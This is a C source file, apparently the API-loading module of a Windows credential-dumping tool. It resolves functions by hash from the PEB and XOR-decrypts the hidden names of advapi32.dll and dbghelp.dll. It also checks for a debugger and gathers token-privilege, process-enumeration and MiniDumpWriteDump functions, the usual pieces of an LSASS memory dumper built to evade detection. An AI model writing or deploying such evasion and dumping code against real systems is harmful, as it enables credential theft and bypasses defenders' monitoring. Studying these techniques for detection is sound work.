#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#include "CalcAPI.h"
#include "LoadAPI.h"
#include "Decryption.h"

BOOL loadApi(API_Call *APICall) {
	Kernel32_API* Kernel32Api = &(APICall->Kernel32Api);
	Advapi32_API* Advapi32Api = &(APICall->Advapi32Api);
	Dbghelp_API* DbghelpApi = &(APICall->DbghelpApi);

	char Advapi32DllStr[] = "\x0F\x35\x3F\x13\x1E\x19\x57\x7E\x40\x0E\x26\x14\x61";
	char DbghelpDllStr[] = "\x2E\x24\x00\x3B\x35\x1D\x2A\x59\x3C\x2B\x26\x79";


	const DWORD hash_kernel32_dll = 0x29cdd463;
	const DWORD hash_LoadLibraryA = 0xe96ce9ef;

	PPEB pPeb = get_peb();
	if (pPeb->BeingDebugged) {
		printf("	[X] Debugger Detected !!!\n");
		//return FALSE;
	}

	LoadLibraryA_F pLoadLibraryA =(LoadLibraryA_F) find_api(pPeb, hash_kernel32_dll, hash_LoadLibraryA);
	if(pLoadLibraryA == NULL)
		return FALSE;

	decryptionRoutine(Advapi32DllStr,13,"\x4E\x51\x49\x72\x6E\x70\x64\x4C\x6E\x6A\x4A\x78\x61");
	decryptionRoutine(DbghelpDllStr,12,"\x6A\x46\x67\x53\x50\x71\x5A\x77\x58\x47\x4A\x79");


	Kernel32Api->CloseHandleF = (CloseHandle_F)find_api(pPeb,hash_kernel32_dll, 0xfef545);
	Kernel32Api->CreateFileAF = (CreateFileA_F)find_api(pPeb,hash_kernel32_dll, 0xe84b3a8e);
	Kernel32Api->GetCurrentProcessF = (GetCurrentProcess_F)find_api(pPeb,hash_kernel32_dll, 0xc75b7345);
	Kernel32Api->CreateToolhelp32SnapshotF = (CreateToolhelp32Snapshot_F)find_api(pPeb,hash_kernel32_dll, 0x9eb60b55);
	Kernel32Api->OpenProcessF = (OpenProcess_F)find_api(pPeb,hash_kernel32_dll, 0x74f0acb6);
	Kernel32Api->Process32FirstF = (Process32First_F)find_api(pPeb,hash_kernel32_dll, 0x454fc0f);
	Kernel32Api->Process32NextF = (Process32Next_F)find_api(pPeb,hash_kernel32_dll, 0xa1178452);
	if(Kernel32Api->CloseHandleF == NULL ||Kernel32Api->CreateFileAF == NULL ||Kernel32Api->GetCurrentProcessF == NULL ||Kernel32Api->CreateToolhelp32SnapshotF == NULL ||Kernel32Api->OpenProcessF == NULL ||Kernel32Api->Process32FirstF == NULL ||Kernel32Api->Process32NextF == NULL)
		return FALSE;

	if(pLoadLibraryA(Advapi32DllStr) != NULL) {
		const DWORD Advapi32Hash = 0x35c841f5;
		memset(Advapi32DllStr,0x00,13);
		Advapi32Api->LookupPrivilegeValueAF = (LookupPrivilegeValueA_F)find_api(pPeb,Advapi32Hash, 0x7206e77e);
		Advapi32Api->OpenProcessTokenF = (OpenProcessToken_F)find_api(pPeb,Advapi32Hash, 0x4296f923);
		Advapi32Api->AdjustTokenPrivilegesF = (AdjustTokenPrivileges_F)find_api(pPeb,Advapi32Hash, 0xc87f17a3);
		Advapi32Api->PrivilegeCheckF = (PrivilegeCheck_F)find_api(pPeb,Advapi32Hash, 0xd1152ac4);
		if(Advapi32Api->LookupPrivilegeValueAF == NULL ||Advapi32Api->OpenProcessTokenF == NULL ||Advapi32Api->AdjustTokenPrivilegesF == NULL ||Advapi32Api->PrivilegeCheckF == NULL)
			return FALSE;
	}else
		return FALSE;

	if(pLoadLibraryA(DbghelpDllStr) != NULL) {
		const DWORD DbghelpHash = 0x8f802b95;
		memset(DbghelpDllStr,0x00,12);
		DbghelpApi->MiniDumpWriteDumpF = (MiniDumpWriteDump_F)find_api(pPeb,DbghelpHash, 0x8d228a59);
		if(DbghelpApi->MiniDumpWriteDumpF == NULL)
			return FALSE;
	}else
		return FALSE;

	return TRUE;
}
